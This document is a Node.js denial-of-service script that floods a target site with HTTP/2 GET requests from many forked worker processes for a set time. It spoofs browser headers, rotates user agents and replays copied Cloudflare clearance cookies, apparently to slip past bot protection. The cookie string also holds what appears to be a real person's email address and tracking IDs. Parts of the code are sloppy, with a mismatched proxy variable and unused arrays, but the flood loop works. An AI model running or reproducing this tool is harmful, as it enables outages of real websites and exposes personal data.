const fs = require('fs');
const url = require('url');
const http2 = require('http2');
const cluster = require('cluster');

if (process.argv.length <= 3) {
    console.log(` [ HOST ] [ THREAD ] [ TIME ]`);
    process.exit(-1);
}

var target = process.argv[2];
var parsed = url.parse(target);
var host = url.parse(target).host;
var threads = process.argv[3];
var time = process.argv[4];
require('events').EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);

process.on('uncaughtException', function (e) {});
process.on('unhandledRejection', function (e) {});

let userAgents = [];
userAgents = fs.readFileSync('/sdcard/download/ua.txt', 'utf8').split('\n');
let proxyList = [];
proxylist = fs.readFileSync('/sdcard/download/proxy.txt', 'utf8').split('\n');

const nullHexs = [
    "\x00",
    "\xFF",
    "\xC2",
    "\xA0",
    "\x82",
    "\x56",
    "\x87",
    "\x88",
    "\x27",
    "\x31",
    "\x18",
    "\x42",
    "\x17",
    "\x90",
    "\x14",
    "\x82",
    "\x18",
    "\x26",
    "\x61",
    "\x04",
    "\x05",
    "\xac",
    "\x02",
    "\x50",
    "\x84",
    "\x78"
];

if (cluster.isMaster) {
    for (let i = 0; i < threads; i++) {
        cluster.fork();
    }
    setTimeout(() => {
        process.exit(1);
    }, time * 1000);
} else {
    startflood();
}

function startflood() {
    var int = setInterval(() => {
        const client = http2.connect(target);

        for (var i = 0; i < 64; i++) {
            const headers = {
                [http2.constants.HTTP2_HEADER_PATH]: '/',
                [http2.constants.HTTP2_HEADER_METHOD]: 'GET',
                'Host': parsed.host,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'User-Agent': generateStrongUserAgent(),
                'Upgrade-Insecure-Requests': '1',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
                'Cache-Control': 'max-age=0',
                'Connection': 'Keep-Alive',
                'Sec-Ch-Ua' : '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"Windows"',
                'Set-Cookie': '__cf_logged_in=1; sparrow_id=%7B%22deviceId%22%3A%22c8e2bd27-a65e-4222-a392-c63ba570157d%22%2C%22userId%22%3A%226d8c21d2880adcd3b08ab265195be490%22%7D; facebook-pixel_dzQR__fb-pixel=fb.2.1702551984350.803453250; __stripe_mid=7f64dc81-9210-4c00-9c54-39af00f098af0f714e; iterableEndUserId=phuocdk2007%40gmail.com; google-analytics_v4_nzcr__ga4=75edcc38-4e29-4c1a-9feb-ebd9e25f9e0b; amplitude_TTin__event_id=2; google-analytics_TVOu___ga=6f96b5eb-a761-4243-906d-a7f7bc634e97; google-analytics_v4_npeT__ga4=46d6f17d-7fd9-42c8-9016-dbde8d764c60; google-analytics_v4_npeT__let=1708152151717; google-analytics_v4_npeT__session_counter=1; google-analytics_v4_npeT__engagementStart=1708152151717; google-analytics_v4_npeT__engagementDuration=0; google-analytics_v4_npeT__counter=1; google-analytics_v4_npeT___z_ga_audiences=46d6f17d-7fd9-42c8-9016-dbde8d764c60; __cf_bm=dHuOzcRqPy9bqvEa5.AUQpP2bJcaijhiiop2kjkcZ1c-1708762566-1.0-ATa8NkYauRd4fiu8YEiSO6dMO0cofW2xgcVBPw64V9/C7mziz2qts0c8HBQGcbM2tRK+P91Nj1y/2KfxcuTQFmde8wP3m9uV+boytq9swHEp; __cfruid=7d089fc6ef40ccca42bcfa2fa42ef11aa1ec043d-1708762566; _cfuvid=aI6PakshMnYVzIbeY50x9ZDD7Up_fKOMrASrXfeQhr4-1708762566132-0.0-604800000; google-analytics_v4_nzcr__session_counter=6; google-analytics_v4_nzcr__ga4sid=581237812; __cflb=0H28upHR6WxXGRqfrsmVntTd5vuFAcimRMUmxA8Zc3P; gates_cohorts=%7B%7D; cf_clearance=hsXN7V09fwCTHyBY_JgdFlLARUYz0KxuYVVl49R6U4k-1708762571-1.0-AaYr8kzLCKHzHykN0oC4ES3HBHDzkl2odFKoMhKEZFdjiUR6w9BZPbx5jtP79BPVLC5p9DTT6Q93A9vbbYfxrXM=; __cf_effload=1; vses2=6d8c21d288-fqoe48431sm4jaf6j33culcs6mk2e4t3; CF_VERIFIED_DEVICE_d081172d3202db91f26d581d774860fa40837765363b6d7d6c21689766802ceb=1708762576; google-analytics_v4_nzcr__engagementDuration=0; OptanonConsent=isGpcEnabled=0&datestamp=Sat+Feb+24+2024+15%3A16%3A18+GMT%2B0700+(Gi%E1%BB%9D+%C4%90%C3%B4ng+D%C6%B0%C6%A1ng)&version=202304.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=c4a7187f-39de-4b28-943e-11b69001baf7&interactionCount=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0003%3A1%2CC0002%3A1%2CC0004%3A1&AwaitingReconsent=false; __stripe_sid=e4718431-9a08-4b8b-b5de-7e91b68e99977ccd18; google-analytics_v4_nzcr__engagementStart=1708762615747; google-analytics_v4_nzcr__counter=82; google-analytics_v4_nzcr__let=1708762615747',
            };

            const reflectProbability = 0.5; // Adjust this probability as needed
            const delayTime = 120000; // Adjust this delay time as needed (2 minutes)

            const options = {
                method: 'GET',
                headers: headers,
                proxy: proxylist[Math.floor(Math.random() * proxylist.length)],
            };

            const req = client.request(options);

            req.on('response', (headers) => {
                // Handle response headers
            });

            req.on('data', (chunk) => {
                // Handle response data
            });

            req.on('end', () => {
                // Handle end of response
                setTimeout(() => {
                    client.close();
                }, 5000);
            });

            req.end();

            setTimeout(() => {
                // Continue with the rest of the code after the delay
            }, delayTime);
        }
    });

    setTimeout(() => {
        clearInterval(int);
    }, time * 1000);
}

function generateStrongUserAgent() {
    const strongUserAgents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0.2'
    ];

    return strongUserAgents[Math.floor(Math.random() * strongUserAgents.length)];
}
